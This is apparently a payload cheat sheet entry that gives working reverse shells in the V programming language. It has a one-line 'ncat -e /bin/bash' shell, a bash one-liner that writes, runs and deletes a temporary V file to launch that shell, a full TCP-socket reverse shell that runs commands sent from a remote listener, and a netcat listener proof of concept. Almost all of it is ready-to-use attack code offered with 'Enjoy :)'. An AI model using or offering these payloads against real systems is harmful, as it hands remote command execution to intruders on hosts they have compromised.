### Vlang Reverse Shell (One Line)

---

- Original Code:

```v
import os

os.system("ncat -e /bin/bash 127.0.0.1 9001 0>&1")
```

- Reverse Shell:

```bash
echo 'import os' > /tmp/t.v && echo 'fn main() { os.system("ncat -e /bin/bash 127.0.0.1 9001 0>&1") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v
```

- How does it work?

*Using the `os` module, we can use the `system()` function to execute a command. Similar to Golang's reverse shell. Vlang doesn't support minifying. So, `import os` had to be written into `/tmp/t.v` first then we append the rest of the code to it. Finally, we delete the file `/tmp/t.v`.*

### Vlang Reverse Shell (TCP Socket)

---

```v
module main

import net
import io
import os

fn run(path string) string {
        mut out := ''
        mut line := ''
        mut cmd := os.Command{ path: path }
        cmd.start() or { panic(err) }

        for {
                line = cmd.read_line()
                out += '${line}\n'
                if cmd.eof { return out }
        }
        return out
}

fn main() {
        mut conn := net.dial_tcp('127.0.0.1:9001') ?
        mut reader := io.new_buffered_reader(reader: conn)
        for {
                result := reader.read_line() or { return }
                conn.write_string(run(result)) or { return }
        }
}
```

### PoC

---

```bash
# Set up listener...
$ nc -lvnp 9001
```

```bash
# Connection recived (Payload Executed)
Connection received on 127.0.0.1 59470
$ whoami
lexxrt
```

##### Enjoy :)